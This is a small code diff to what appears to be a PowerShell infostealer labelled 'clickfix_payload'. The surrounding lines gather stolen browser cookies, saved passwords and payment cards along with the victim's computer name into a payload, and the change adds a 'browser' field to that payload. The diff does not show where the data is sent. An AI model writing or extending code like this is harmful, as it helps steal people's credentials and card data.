@@ -388,7 +388,7 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# BUILD PAYLOAD — INCLUDES PC NAME + PowerShell Browser
+# BUILD PAYLOAD — INCLUDES PC NAME + BROWSER
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
@@ -409,6 +409,7 @@ $payload = @{
         screen = "N/A"
     }
     domain = $pcName
+    browser = "PowerShell"
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
     pcName = $pcName
